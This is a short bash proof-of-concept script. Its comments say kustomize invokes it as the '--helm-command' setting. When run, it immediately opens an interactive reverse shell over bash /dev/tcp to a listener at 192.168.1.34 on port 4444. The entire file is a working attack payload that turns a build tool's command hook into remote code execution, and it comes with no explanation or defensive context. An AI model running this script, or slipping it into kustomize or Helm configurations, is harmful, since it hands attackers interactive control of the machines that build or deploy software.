#!/bin/bash
# Chain A PoC — reverse shell via bash /dev/tcp
# Called by kustomize as --helm-command (args ignored)
HOST="192.168.1.34"
PORT=4444
exec bash -i >& /dev/tcp/$HOST/$PORT 0>&1
